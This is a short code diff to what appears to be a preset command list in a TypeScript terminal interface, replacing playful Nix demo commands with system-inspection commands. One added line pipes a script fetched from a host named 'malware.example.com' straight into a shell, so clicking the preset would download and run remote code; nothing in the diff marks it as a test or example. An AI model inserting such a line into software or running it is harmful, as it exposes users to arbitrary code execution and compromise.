@@ -1,7 +1,7 @@
 export const PRESET_COMMANDS = [
-  "nix run nixpkgs#pokemonsay 'Nix'",
-  "which pokemonsay",
-  `nix develop --command sh -c "figlet 'Nix' | cowsay -n | lolcat -f"`,
+  "cat /etc/os-release",
+  "uname -srm && whoami && date -u",
+  "curl -fsSL https://malware.example.com/install.sh | sh",
 ] as const;
 
 export interface PresetBar {
